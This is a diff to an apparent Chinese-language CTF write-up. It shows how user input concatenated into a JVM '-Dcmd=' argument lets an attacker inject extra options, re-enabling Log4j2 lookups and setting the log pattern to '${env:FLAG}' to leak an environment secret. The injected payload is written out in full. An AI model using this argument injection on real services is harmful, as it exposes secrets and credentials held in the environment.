@@ -214,3 +214,12 @@ def chat(cmd, text):
 
 ```
 `f'-Dcmd={cmd}'`把用户输入直接拼接到了参数中。
+所以这里我们就可以去注入参数了
+比如我们构造
+```bash
+-Dcmd=/weather-Dlog4j2.formatMsgNoLookups=false-Dlog4j2.layout.pattern=${env:FLAG}
+#此时jvm解析后就是
+-Dcmd=/weather
+-Dlog4j2.formatMsgNoLookups=false
+-Dlog4j2.layout.pattern=${env:FLAG}
+```
